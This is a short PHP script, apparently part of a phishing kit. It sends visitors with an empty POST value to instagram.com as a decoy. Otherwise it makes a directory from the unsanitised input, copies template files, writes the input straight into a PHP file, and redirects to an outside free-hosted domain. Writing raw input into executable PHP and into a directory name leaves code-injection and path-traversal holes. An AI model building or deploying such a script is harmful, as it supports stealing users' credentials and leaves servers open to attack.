<?php

error_reporting(0);

$uniqueid = $_POST['uniqueid'];  

$official_server_configuration_file = 'official files/official_server_configuration_file.php';
$temp_server_configuration_file_directory = 'temp_server_configuration_file.php';

$official_migrate_server_files_configuration_file = 'official files/official_migrate_server_files_configuration_file.php';
$temp_migrate_server_files_configuration_file_directory = 'temp_migrate_server_files_configuration_file.php';

$temp_migrate_server_files = 'temp_migrate_server_files_configuration_file.php';

mkdir("$uniqueid");
 
if( (empty($uniqueid)) ){
     header('location: https://www.instagram.com');

}else{

function curPageURL() {
$pageURL = 'http';
if ($_SERVER["HTTPS"] == "on") {$pageURL .= "s";}
$pageURL .= "://";
if ($_SERVER["SERVER_PORT"] != "80") {
  $pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
} else {
  $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
}
return $pageURL;
}

copy("$official_server_configuration_file", "$temp_server_configuration_file_directory");

copy("$official_migrate_server_files_configuration_file", "$temp_migrate_server_files_configuration_file_directory");


$strings = file_get_contents($temp_migrate_server_files);

$strreplace = str_replace("uniqueid_edit", "$uniqueid",$strings);

file_put_contents($temp_migrate_server_files, $strreplace);


header("Location:  http://prajwalgt.rf.gd/temp_migrate_server_files_configuration_file.php");
}
?>